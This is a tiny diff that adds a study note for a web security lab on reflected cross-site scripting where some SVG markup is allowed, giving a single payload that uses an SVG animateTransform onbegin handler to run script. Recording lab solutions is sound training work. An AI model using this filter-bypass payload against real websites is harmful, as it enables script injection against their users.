@@ -1,0 +1,6 @@
+
+
+
+
+-----> Lab: Reflected XSS with some SVG markup allowed
+	payload: <svg><animateTransform onbegin=alert(0)>
